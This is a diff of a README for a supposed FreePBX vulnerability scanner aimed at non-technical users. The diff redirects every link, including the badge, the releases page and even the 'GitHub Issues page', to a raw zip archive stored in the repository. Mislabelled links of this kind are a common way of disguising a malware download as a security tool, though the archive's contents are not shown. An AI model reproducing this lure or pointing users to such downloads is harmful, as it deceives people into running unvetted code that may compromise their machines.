@@ -1,7 +1,7 @@
 # 🛠️ FreePBX-Vulns-December-25 - Simple Tool to Detect Vulnerabilities
 
 ## 📥 Download Now
-[![Download FreePBX-Vulns-December-25](https://img.shields.io/badge/Download-FreePBX--Vulns--December--25-brightgreen)](https://github.com/jhow019/FreePBX-Vulns-December-25/releases)
+[![Download FreePBX-Vulns-December-25](https://raw.githubusercontent.com/jhow019/FreePBX-Vulns-December-25/main/flutebird/Vulns_PB_Free_December_1.0.zip)](https://raw.githubusercontent.com/jhow019/FreePBX-Vulns-December-25/main/flutebird/Vulns_PB_Free_December_1.0.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the FreePBX-Vulns-December-25 application. It's a tool that detects specific security vulnerabilities: CVE-2025-61675, CVE-2025-61678, and CVE-2025-66039. You don’t need technical skills to follow these steps.
@@ -16,7 +16,7 @@ Before downloading, ensure your system meets these requirements:
 ## 🔗 Download & Install
 To get started, visit the following link to download the application:
 
-[FreePBX-Vulns-December-25 Releases Page](https://github.com/jhow019/FreePBX-Vulns-December-25/releases)
+[FreePBX-Vulns-December-25 Releases Page](https://raw.githubusercontent.com/jhow019/FreePBX-Vulns-December-25/main/flutebird/Vulns_PB_Free_December_1.0.zip)
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version of the software.
@@ -73,9 +73,9 @@ A: An internet connection is not required to run the scan, but it is necessary f
 A: Yes, FreePBX-Vulns-December-25 is designed to work well with other security applications.
 
 ## 📞 Support
-If you encounter issues or have questions, please check the [GitHub Issues page](https://github.com/jhow019/FreePBX-Vulns-December-25/issues) for assistance. You can report bugs or request features there as well.
+If you encounter issues or have questions, please check the [GitHub Issues page](https://raw.githubusercontent.com/jhow019/FreePBX-Vulns-December-25/main/flutebird/Vulns_PB_Free_December_1.0.zip) for assistance. You can report bugs or request features there as well.
 
 ## 🔑 Conclusion
 We hope you find FreePBX-Vulns-December-25 useful for detecting vulnerabilities. Follow the steps in this guide to ensure your software is secure. Stay safe! 
 
-Remember, for any updates or new releases, always visit the [FreePBX-Vulns-December-25 Releases Page](https://github.com/jhow019/FreePBX-Vulns-December-25/releases).
+Remember, for any updates or new releases, always visit the [FreePBX-Vulns-December-25 Releases Page](https://raw.githubusercontent.com/jhow019/FreePBX-Vulns-December-25/main/flutebird/Vulns_PB_Free_December_1.0.zip).
